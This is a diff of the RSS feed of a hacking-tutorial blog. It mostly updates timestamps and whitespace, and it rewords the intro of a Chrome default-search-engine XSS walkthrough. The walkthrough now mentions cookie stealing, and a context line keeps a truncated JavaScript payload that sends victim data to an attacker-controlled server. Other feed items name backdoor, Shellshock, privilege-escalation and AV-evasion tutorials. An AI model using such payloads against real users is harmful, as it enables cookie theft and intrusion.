@@ -2,8 +2,8 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
 <channel><title>metalkey</title><link>https://metalkey.github.io/index.html</link>
 <description>Hacking tutorials + info</description><language>en</language>
-<lastBuildDate>Sun, 17 Jun 2018 20:14:29 +1000</lastBuildDate>
-<pubDate>Sun, 17 Jun 2018 20:14:29 +1000</pubDate>
+<lastBuildDate>Sun, 17 Jun 2018 20:16:44 +1000</lastBuildDate>
+<pubDate>Sun, 17 Jun 2018 20:16:44 +1000</pubDate>
 <atom:link href="https://metalkey.github.io/feed.rss" rel="self" type="application/rss+xml" />
 <item><title>
 Mousejack on the WiFi Pineapple
@@ -33,6 +33,7 @@ root@pineapple:~$ <com>./setup.py install</com><br>
 
 
 
+
 <!-- text end -->
 ]]></description><link>https://metalkey.github.io/mousejack-on-the-wifi-pineapple.html</link>
 <guid>https://metalkey.github.io/./mousejack-on-the-wifi-pineapple.html</guid>
@@ -44,10 +45,11 @@ Google Chrome Search Poison – Default Search Engine Exploit
 
 <h2>Introduction</h2>
 
-<p>In December 2015, I discovered a vulnerability in Google Chrome's default search engines feature whereby a lack of input sanitation allows an attacker to store XSS in the victim's browser. This stored XSS is then executed whenever the victim searches using the omnibox.<br>
+<p>In December 2015, I discovered a vulnerability in Google Chrome's default search engines feature allowing for the execution of malicious JavaScript whenever the victim performs a search using the omnibox (i.e. URL textbox).<br>
+The malicious JavaScript can be set to perform various functions including: Cookie Stealing, Search Keywords Interception, Browser Fingerprinting, etc...<br>
 In this walkthrough we'll set up a Python SimpleHTTPServer and intercept the victim’s Cookies and search keywords.<br>
 <br>
-Note: The vulnerability has been reported to (and ignored by) the Google/Chromium team.</p>
+Note: The vulnerability was reported to the Google/Chromium team but was considered a feature rather than a vulnerability.</p>
 
 <h2>Video Demo</h2>
 
@@ -118,6 +120,7 @@ javascript:window.location=’http://192.168.1.182/%s ‘+escape(navigator.produ
 
 
 
+
 <!-- text end -->
 ]]></description><link>https://metalkey.github.io/google-chrome-search-poison---default-search-engine-exploit.html</link>
 <guid>https://metalkey.github.io/./google-chrome-search-poison---default-search-engine-exploit.html</guid>
@@ -177,6 +180,7 @@ root@kali:~#	<com>cat emails.sh</com><br>
 
 
 
+
 <!-- text end -->
 ]]></description><link>https://metalkey.github.io/company-email-enumeration--breached-email-finder.html</link>
 <guid>https://metalkey.github.io/./company-email-enumeration--breached-email-finder.html</guid>
@@ -212,6 +216,7 @@ Installing Wickr on Ubuntu 16.04
 </code>
 
 <p>Tags: <a href='tag_privacy.html'>privacy</a></p>
+
 
 
 
@@ -274,6 +279,7 @@ Port Scanning With Netcat (Up to 1000 ports/second)
 </p>
 
 <p>Tags: <a href='tag_port-scanning.html'>port-scanning</a></p>
+
 
 
 
@@ -363,6 +369,7 @@ root@metasploitable:/etc/unreal#
 
 
 
+
 <!-- text end -->
 ]]></description><link>https://metalkey.github.io/unrealircd-3281-backdoor-command-execution.html</link>
 <guid>https://metalkey.github.io/./unrealircd-3281-backdoor-command-execution.html</guid>
@@ -409,6 +416,7 @@ root@metasploitable:/#
 <p></code></p>
 
 <p>Tags: <a href='tag_backdoors.html'>backdoors</a></p>
+
 
 
 
@@ -514,6 +522,7 @@ root
 <p></code></p>
 
 <p>Tags: <a href='tag_privilege-escalation.html'>privilege-escalation</a></p>
+
 
 
 
@@ -680,6 +689,7 @@ If your system is vulnerable, ensure it is patched immediately by upgrading your
 
 
 
+
 <!-- text end -->
 ]]></description><link>https://metalkey.github.io/shellshock-explained--exploitation-tutorial.html</link>
 <guid>https://metalkey.github.io/./shellshock-explained--exploitation-tutorial.html</guid>
@@ -794,6 +804,7 @@ C:\7-ZipPortable>
 <p></code></p>
 
 <p>Tags: <a href='tag_av-evasion.html'>av-evasion</a></p>
+
 
 
 
